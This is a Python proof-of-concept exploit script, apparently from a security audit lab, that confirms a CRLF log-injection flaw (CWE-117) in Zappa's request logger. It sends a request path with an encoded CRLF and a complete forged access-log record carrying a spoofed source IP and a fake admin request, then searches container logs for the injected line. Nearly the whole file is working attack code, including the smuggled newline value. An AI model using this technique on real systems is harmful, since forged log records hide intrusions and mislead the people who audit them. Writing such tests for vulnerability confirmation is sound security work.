#!/usr/bin/env python3
"""VULN-007 — CRLF / log injection into the Common Log Format access line.

Vulnerable code : targets/Zappa/zappa/utilities.py:1027-1052 (ApacheNCSAFormatters.format_log)
                  fed by targets/Zappa/zappa/wsgi.py:129 (path = unquote(event["path"]))
Vulnerability   : CWE-117 Improper Output Neutralization for Logs.
Surface         : A (HTTP request path — internet-facing).

Mechanism (plain English)
-------------------------
Zappa logs every request in Common Log Format by interpolating request fields
into a single string with no neutralisation:

    request = f"{method} {path_info}{query_string} {server_protocol}"
    log_entry = f'{host} - - [{dt}] "{request}" {status} {len} "{referer}" "{agent}"'
    logger.info(log_entry)

`path_info` comes from `unquote(event["path"])` (wsgi.py:129) — so `%0d%0a` in the
request path decodes to a real CR/LF *before* it is placed into the log line. An
attacker therefore injects newlines into the log stream and forges entire,
attacker-authored log records (spoofed source IPs, fake requests, hidden real
activity). `referer`/`agent`/`host` are interpolated unescaped too.

What a successful run proves
----------------------------
A request with an encoded CRLF in its path causes a fully attacker-controlled,
standalone forged access-log line to appear in the container's log output.
"""
import os
import subprocess
import sys
import time
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import LAB_CONTAINER, banner, build_request, log, raw_request, verdict

VULN = "VULN-007"


def main():
    banner(VULN, "CRLF/log injection into the Common Log Format",
           "zappa/utilities.py:1027-1052 format_log <- wsgi.py:129 unquote(path)")

    token = "PWN_" + os.urandom(4).hex()  # unique marker so we match only THIS run's forged line
    # A complete, attacker-authored CLF record. %0d%0a is the injected CRLF.
    forged = f'66.66.66.66 - - [01/Jan/2099:00:00:00 +0000] "GET /admin/{token} HTTP/1.1" 200 0 "-" "-"'
    # Build the malicious path: /x + CRLF + forged line, URL-encoded so it survives to unquote().
    path = "/x%0d%0a" + urllib.parse.quote(forged, safe="")
    log("STEP", f"GET a path containing an encoded CRLF + a forged CLF record (marker {token})")

    since = str(int(time.time()) - 2)
    raw_request(build_request("GET", path, {"User-Agent": "probe"}))
    time.sleep(1.0)

    # Zappa emits its CLF line via logger.info; the injected CRLF splits it into a
    # standalone forged line. werkzeug's own access log shows the still-encoded path,
    # so a *decoded* forged line starting with our record is unambiguously Zappa's.
    logs = subprocess.run(
        ["docker", "logs", "--since", since, LAB_CONTAINER], capture_output=True, text=True
    )
    stream = logs.stdout + logs.stderr
    forged_prefix = f'66.66.66.66 - - [01/Jan/2099:00:00:00 +0000] "GET /admin/{token}'
    injected_line = None
    for line in stream.splitlines():
        # A genuine forged record: the line STARTS with our attacker content (not embedded
        # inside a legitimate, still-URL-encoded werkzeug line).
        if line.startswith("66.66.66.66") and token in line and "%0d%0a" not in line:
            injected_line = line
            break

    if injected_line:
        log("INFO", f"forged standalone log line: {injected_line}")
        log("PROOF", f"an encoded CRLF in the request path produced a separate, fully attacker-authored "
                     f"access-log record (source IP 66.66.66.66, fake 'GET /admin/{token}') in the log "
                     f"stream — Zappa's CLF formatter interpolates the decoded path with no neutralisation.")
        log("OK", "exploit confirmed — CRLF log injection / forged log records")
        verdict("CONFIRMED", f"{VULN}: CONFIRMED — CRLF in path forges standalone log entries (CWE-117)")
        return 0
    log("FAIL", "no decoded standalone forged line found in container logs")
    log("INFO", "recent log tail:\n" + "\n".join(stream.splitlines()[-8:]))
    verdict("NEEDS_MANUAL", f"{VULN}: NEEDS_MANUAL — CRLF not observed in this log sink")
    return 1


if __name__ == "__main__":
    sys.exit(main())
